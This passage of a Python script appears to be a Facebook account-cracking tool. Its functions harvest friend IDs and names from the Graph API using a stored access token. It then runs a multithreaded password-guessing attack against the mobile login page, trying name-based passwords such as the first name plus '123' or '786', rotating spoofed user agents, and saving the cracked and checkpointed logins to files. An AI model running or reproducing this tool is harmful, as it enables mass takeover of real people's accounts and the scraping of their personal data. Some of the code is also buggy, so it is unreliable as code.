        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r2 = requests.get('https://graph.facebook.com/' + d2 + '/friends?access_token=' + token)
    z = json.loads(r2.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    
    cop=str(input('[!] File path : '))
    shutil.move(file,cop)
    print ('[*] Your File Save In : '+cop)
    input('[*] Press Enter To Back')
    main()

def ext3():
    rana=[]
    try:
        token=open('token.txt').read()
    except:
        main()
    print ("")
    d1=int(input('[1] Enter ID : '))
    d2=int(input('[2] Enter ID : '))
    d3=int(input('[3] Enter ID : '))
        
    r = requests.get('https://graph.facebook.com/' + d1 + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r2 = requests.get('https://graph.facebook.com/' + d2 + '/friends?access_token=' + token)
    z = json.loads(r2.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r3 = requests.get('https://graph.facebook.com/' + d3 + '/friends?access_token=' + token)
    z = json.loads(r3.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    
    cop=str(input('[!] File path : '))
    shutil.move(file,cop)
    print ('[*] Your File Save In : '+cop)
    input('[*] Press Enter To Back')
    main()

def ext4():
    rana=[]
    try:
        token=open('token.txt').read()
    except:
        main()
    print ("")
    d1=int(input('[1] Enter ID : '))
    d2=int(input('[2] Enter ID : '))
    d3=int(input('[3] Enter ID : '))
    d4=int(input('[4] Enter ID : '))
    r = requests.get('https://graph.facebook.com/' + d1 + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r2 = requests.get('https://graph.facebook.com/' + d2 + '/friends?access_token=' + token)
    z = json.loads(r2.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r3 = requests.get('https://graph.facebook.com/' + d3 + '/friends?access_token=' + token)
    z = json.loads(r3.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r4 = requests.get('https://graph.facebook.com/' + d4 + '/friends?access_token=' + token)
    z = json.loads(r4.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    
    cop=str(input('[*] File path : '))
    shutil.move(file,cop)
    print ('[*] Your File Save In : '+cop)
    input('[*] Press Enter To Back')
    main()

def ext5():
    rana=[]
    try:
        token=open('token.txt').read()
    except:
        main()
    print ("")
    d1=int(input('[1] Enter ID : '))
    d2=int(input('[2] Enter ID : '))
    d3=int(input('[3] Enter ID : '))
    d4=int(input('[4] Enter ID : '))
    d5=int(input('[5] Enter ID : '))
    r = requests.get('https://graph.facebook.com/' + d1 + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r2 = requests.get('https://graph.facebook.com/' + d2 + '/friends?access_token=' + token)
    z = json.loads(r2.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r3 = requests.get('https://graph.facebook.com/' + d3 + '/friends?access_token=' + token)
    z = json.loads(r3.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r4 = requests.get('https://graph.facebook.com/' + d4 + '/friends?access_token=' + token)
    z = json.loads(r4.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r5 = requests.get('https://graph.facebook.com/' + d5 + '/friends?access_token=' + token)
    z = json.loads(r5.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    
    cop=str(input('[!] File path : '))
    shutil.move(file,cop)
    print ('[*] Your File Save In : '+cop)
    input('[*] Press Enter To Back')
    main()

def ext6():
    rana=[]
    try:
        token=open('token.txt').read()
    except:
        main()
    print ("")
    d1=int(input('[1] Enter ID : '))
    d2=int(input('[2] Enter ID : '))
    d3=int(input('[3] Enter ID : '))
    d4=int(input('[4] Enter ID : '))
    d5=int(input('[5] Enter ID : '))
    d6=int(input('[6] Enter ID : '))
    
    r = requests.get('https://graph.facebook.com/' + d1 + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r2 = requests.get('https://graph.facebook.com/' + d2 + '/friends?access_token=' + token)
    z = json.loads(r2.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r3 = requests.get('https://graph.facebook.com/' + d3 + '/friends?access_token=' + token)
    z = json.loads(r3.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r4 = requests.get('https://graph.facebook.com/' + d4 + '/friends?access_token=' + token)
    z = json.loads(r4.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r5 = requests.get('https://graph.facebook.com/' + d5 + '/friends?access_token=' + token)
    z = json.loads(r5.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r6 = requests.get('https://graph.facebook.com/' + d6 + '/friends?access_token=' + token)
    z = json.loads(r6.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    
    cop=str(input('[!] File path : '))
    shutil.move(file,cop)
    print ('[*] Your File Save In : '+cop)
    input('[*] Press Enter To Back')
    main()
    
def ext7():
    rana=[]
    try:
        token=open('token.txt').read()
    except:
        main()
    print ("")
    d1=int(input('[1] Enter ID : '))
    d2=int(input('[2] Enter ID : '))
    d3=int(input('[3] Enter ID : '))
    d4=int(input('[4] Enter ID : '))
    d5=int(input('[5] Enter ID : '))
    d6=int(input('[6] Enter ID : '))
    d7=int(input('[7] Enter ID : '))
    
    r = requests.get('https://graph.facebook.com/' + d1 + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r2 = requests.get('https://graph.facebook.com/' + d2 + '/friends?access_token=' + token)
    z = json.loads(r2.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r3 = requests.get('https://graph.facebook.com/' + d3 + '/friends?access_token=' + token)
    z = json.loads(r3.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r4 = requests.get('https://graph.facebook.com/' + d4 + '/friends?access_token=' + token)
    z = json.loads(r4.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r5 = requests.get('https://graph.facebook.com/' + d5 + '/friends?access_token=' + token)
    z = json.loads(r5.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r6 = requests.get('https://graph.facebook.com/' + d6 + '/friends?access_token=' + token)
    z = json.loads(r6.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r7 = requests.get('https://graph.facebook.com/' + d7 + '/friends?access_token=' + token)
    z = json.loads(r7.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    
    cop=str(input('[!] File path : '))
    shutil.move(file,cop)
    print ('[*] Your File Save In : '+cop)
    input('[*] Press Enter To Back')
    main()

def ext8():
    rana=[]
    try:
        token=open('token.txt').read()
    except:
        main()
    print ("")
    d1=int(input('[1] Enter ID : '))
    d2=int(input('[2] Enter ID : '))
    d3=int(input('[3] Enter ID : '))
    d4=int(input('[4] Enter ID : '))
    d5=int(input('[5] Enter ID : '))
    d6=int(input('[6] Enter ID : '))
    d7=int(input('[7] Enter ID : '))
    d8=int(input('[8] Enter ID : '))
    
    r = requests.get('https://graph.facebook.com/' + d1 + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r2 = requests.get('https://graph.facebook.com/' + d2 + '/friends?access_token=' + token)
    z = json.loads(r2.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r3 = requests.get('https://graph.facebook.com/' + d3 + '/friends?access_token=' + token)
    z = json.loads(r3.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r4 = requests.get('https://graph.facebook.com/' + d4 + '/friends?access_token=' + token)
    z = json.loads(r4.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r5 = requests.get('https://graph.facebook.com/' + d5 + '/friends?access_token=' + token)
    z = json.loads(r5.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r6 = requests.get('https://graph.facebook.com/' + d6 + '/friends?access_token=' + token)
    z = json.loads(r6.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r7 = requests.get('https://graph.facebook.com/' + d7 + '/friends?access_token=' + token)
    z = json.loads(r7.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r8 = requests.get('https://graph.facebook.com/' + d8 + '/friends?access_token=' + token)
    z = json.loads(r8.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    
    cop=str(input('[!] File path : '))
    shutil.move(file,cop)
    print ('[*] Your File Save In : '+cop)
    input('[*] Press Enter To Back')
    main()

def ext9():
    rana=[]
    try:
        token=open('token.txt').read()
    except:
        main()
    print ("")
    d1=int(input('[1] Enter ID : '))
    d2=int(input('[2] Enter ID : '))
    d3=int(input('[3] Enter ID : '))
    d4=int(input('[4] Enter ID : '))
    d5=int(input('[5] Enter ID : '))
    d6=int(input('[6] Enter ID : '))
    d7=int(input('[7] Enter ID : '))
    d8=int(input('[8] Enter ID : '))
    d9=int(input('[8] Enter ID : '))
    
    r = requests.get('https://graph.facebook.com/' + d1 + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r2 = requests.get('https://graph.facebook.com/' + d2 + '/friends?access_token=' + token)
    z = json.loads(r2.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r3 = requests.get('https://graph.facebook.com/' + d3 + '/friends?access_token=' + token)
    z = json.loads(r3.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r4 = requests.get('https://graph.facebook.com/' + d4 + '/friends?access_token=' + token)
    z = json.loads(r4.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r5 = requests.get('https://graph.facebook.com/' + d5 + '/friends?access_token=' + token)
    z = json.loads(r5.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r6 = requests.get('https://graph.facebook.com/' + d6 + '/friends?access_token=' + token)
    z = json.loads(r6.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r7 = requests.get('https://graph.facebook.com/' + d7 + '/friends?access_token=' + token)
    z = json.loads(r7.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r8 = requests.get('https://graph.facebook.com/' + d8 + '/friends?access_token=' + token)
    z = json.loads(r8.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r9 = requests.get('https://graph.facebook.com/' + d9 + '/friends?access_token=' + token)
    z = json.loads(r9.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    
    cop=str(input('[!] File path : '))
    shutil.move(file,cop)
    print ('[*] Your File Save In : '+cop)
    input('[*] Press Enter To Back')
    main()
    
def ext10():
    rana=[]
    try:
        token=open('token.txt').read()
    except:
        main()
    print ("")
    d1=int(input('[1] Enter ID : '))
    d2=int(input('[2] Enter ID : '))
    d3=int(input('[3] Enter ID : '))
    d4=int(input('[4] Enter ID : '))
    d5=int(input('[5] Enter ID : '))
    d6=int(input('[6] Enter ID : '))
    d7=int(input('[7] Enter ID : '))
    d8=int(input('[8] Enter ID : '))
    d9=int(input('[8] Enter ID : '))
    d10=int(input('[10] Enter ID : '))
    
    r = requests.get('https://graph.facebook.com/' + d1 + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r2 = requests.get('https://graph.facebook.com/' + d2 + '/friends?access_token=' + token)
    z = json.loads(r2.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r3 = requests.get('https://graph.facebook.com/' + d3 + '/friends?access_token=' + token)
    z = json.loads(r3.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r4 = requests.get('https://graph.facebook.com/' + d4 + '/friends?access_token=' + token)
    z = json.loads(r4.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r5 = requests.get('https://graph.facebook.com/' + d5 + '/friends?access_token=' + token)
    z = json.loads(r5.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r6 = requests.get('https://graph.facebook.com/' + d6 + '/friends?access_token=' + token)
    z = json.loads(r6.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r7 = requests.get('https://graph.facebook.com/' + d7 + '/friends?access_token=' + token)
    z = json.loads(r7.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r8 = requests.get('https://graph.facebook.com/' + d8 + '/friends?access_token=' + token)
    z = json.loads(r8.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r9 = requests.get('https://graph.facebook.com/' + d9 + '/friends?access_token=' + token)
    z = json.loads(r9.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r10 = requests.get('https://graph.facebook.com/' + d10 + '/friends?access_token=' + token)
    z = json.loads(r10.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    
    cop=str(input('[!] File path : '))
    shutil.move(file,cop)
    print ('[*] Your File Save In : '+cop)
    input('[*] Press Enter To Back')
    main()





def fileauto():
    os.system('clear')
    print (logo)
    print ("")
    print ("")
    try:
        mf=str(input('[!] Enter path : '))
        print ('')
        for line in open(mf,'r').readlines():
            idx.append(line.strip())
    except:
        print ('file not found')
        time.sleep(2)
        n_f_p_pass()
        
        
    print ("[!] total ids : "+str(len(idx)))
    os.system('echo " -----------------------------------"| lolcat')
    print (("    Cracking Start Please Wait .."))
    print ("    Use Flight Mod For For Speed Up")
    os.system('echo " -----------------------------------"| lolcat')
    
    def main(arg):
        user=arg
        uid, name = user.split("|")
        name=name.lower()
        first = name.rsplit(' ')[0]
        try:
            last = name.rsplit(' ')[1]
        except:
            pass
        lines = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]", 
			"Mozilla/5.0 (Linux; Android 11; SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", 
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
		])
        try:
            pass1 = name
            rana = requests.Session()
            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = rana.get('https://mbasic.facebook.com')
            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
            if 'c_user' in rana.cookies.get_dict().keys():
                print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass1)
                ok=open('RK-ok.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
            else:
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass1)
                    cp=open('RK-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(uid+pass1)
                else:
                    pass2 = first+"123"
                    rana = requests.Session()
                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                    p = rana.get('https://mbasic.facebook.com')
                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass2)
                        ok=open('RK-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        oks.append(uid+pass2)
                    else:
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass2)
                            cp=open('RK-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                        else:
                            pass3 = first+"last"
                            rana = requests.Session()
                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                            p = rana.get('https://mbasic.facebook.com')
                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass3)
                                ok=open('RK-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                oks.append(uid+pass3)
                            else:
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass3)
                                    cp=open('RK-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
                                else:
                                    pass4 = first+"12345"
                                    rana = requests.Session()
                                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                    p = rana.get('https://mbasic.facebook.com')
                                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass4)
                                        ok=open('RK-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        oks.append(uid+pass4)
                                    else:
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass4)
                                            cp=open('RK-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            cps.append(uid+pass4)
                                        else:
                                            pass5 = first+"786"
                                            rana = requests.Session()
                                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                            p = rana.get('https://mbasic.facebook.com')
                                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass5)
                                                ok=open('RK-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                oks.append(uid+pass5)
                                            else:
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass5)
                                                    cp=open('RK-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
                            
                    
        except:
            pass
    
    p = ThreadPool(30)
    p.map(main, idx)
    print ("\x1b[1;97m")
    print (39*'-')
    print ("[!] cloning complete result ........")
    print (39*'-')
    print ('[!] total ok ids : '+str(len(oks)))
    print ('[!] total cp ids : '+str(len(cps)))
    print (39*'-')
    print ('')
    input(' Press enter to back ')
    main()

def n_f_p_pass():
    os.system('clear')
    print (logo)
    print ("")
    ps1=int(input('[1] name + digit : '))
    ps2=int(input('[2] name + digit : '))
    ps3=int(input('[3] name + digit : '))
    ps4=int(input('[4] name + digit : '))
    print ("")
    try:
        mf=int(input('[!] Enter path : '))
        print ('')
        for line in open(mf,'r').readlines():
            idx.append(line.strip())
    except:
        print ('file not found')
        time.sleep(2)
        n_f_p_pass()
        
        
    print ("[!] total ids : "+str(len(idx)))
    os.system('echo " -----------------------------------"| lolcat')
    print ("    Cracking Start Please Wait .. ")
    print ( "   Use Flight Mod For Speed Up")
    os.system('echo " -----------------------------------"| lolcat')
    
    def main(arg):
        user=arg
        uid, name = user.split("|")
        name=name.lower()
        first = name.rsplit(' ')[0]
        try:
            last = name.rsplit(' ')[1]
        except:
            pass
        lines = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]", 
			"Mozilla/5.0 (Linux; Android 11; SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", 
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
		])
        try:
            pass1 = name
            rana = requests.Session()
            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = rana.get('https://mbasic.facebook.com')
            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
            if 'c_user' in rana.cookies.get_dict().keys():
                print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass1)
                ok=open('RK-ok.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
            else:
                if 'checkpoint' in rana.cookies.get_dict().keys():
